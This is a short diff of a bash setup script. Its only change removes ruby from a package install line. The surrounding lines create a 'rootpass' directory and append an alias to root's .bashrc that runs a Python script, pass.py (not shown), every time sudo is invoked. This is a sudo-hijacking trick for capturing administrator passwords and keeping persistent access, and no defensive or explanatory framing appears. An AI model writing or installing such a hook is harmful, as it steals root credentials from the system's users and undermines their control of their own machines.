@@ -1,5 +1,5 @@
 #!/bin/bash
-apt install ruby python3 -y
+apt install python3 -y
 cd /home
 sudo mkdir rootpass
 sudo echo "alias sudo=\'python3 /home/rootpass/pass.py && sudo\'" >> /root/.bashrc
